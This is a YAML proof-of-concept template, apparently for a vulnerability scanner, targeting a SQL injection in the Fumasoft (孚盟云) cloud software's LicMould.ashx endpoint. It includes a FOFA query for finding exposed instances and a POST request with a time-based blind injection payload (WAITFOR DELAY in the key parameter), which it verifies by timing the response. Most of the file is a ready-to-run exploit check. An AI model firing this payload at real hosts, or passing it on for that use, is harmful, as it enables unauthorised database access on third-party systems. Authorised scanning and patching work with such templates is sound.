id: poc-yaml-fumasoft-licmould-ashx-sqli
info:
  name: 孚盟云 LicMould.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
variables:
  t1: random_int(4,9)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"孚盟云")
- method: POST
  path: /Ajax/LicMould.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: action=DeleteEmp&key=-99+WAITFOR+DELAY+'0:0:{{.t1}}'--&fuids=abc
  expression: status_code == 200 && body == "ok" && duration > t1 && duration < t2
transport: http
